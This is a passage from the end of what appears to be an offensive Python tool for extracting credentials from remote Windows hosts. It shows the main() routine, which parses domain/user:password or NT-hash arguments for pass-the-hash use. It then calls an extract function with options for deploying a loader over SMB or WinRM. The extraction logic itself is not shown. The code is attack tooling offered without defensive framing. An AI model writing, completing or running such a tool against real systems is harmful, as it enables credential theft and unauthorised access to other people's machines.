        success = extract_local(output=args.output)
        if success: log("Extraction complete!", "+")
        else: log("Extraction failed", "-")
        return 0 if success else 1

    if not args.target or not args.credentials:
        parser.print_help()
        return 1

    nt_hash = None
    if args.hashes:
        parts = args.hashes.split(":")
        nt_hash = parts[-1]
        if len(nt_hash) != 32:
            log("NT hash must be 32 hex characters", "-")
            return 1

    cred = args.credentials
    if "/" in cred:
        domain, rest = cred.split("/", 1)
    else:
        domain, rest = ".", cred
    if ":" in rest:
        user, password = rest.split(":", 1)
    elif nt_hash:
        user, password = rest, ""
    else:
        log("Password or --hashes required", "-")
        return 1

    success = extract(args.target, domain, user, password,
                      output=args.output, ldr_name=args.ldr_name,
                      method=args.exec_method, smb_ver=args.smb,
                      nt_hash=nt_hash, port=args.port, timeout=args.timeout,
                      winrm_port=args.winrm_port, deploy_dir=args.deploy_dir)
    if success:
        log("Extraction complete!", "+")
    else:
        log("Extraction failed", "-")
    return 0 if success else 1
if __name__ == "__main__":
    sys.exit(main())
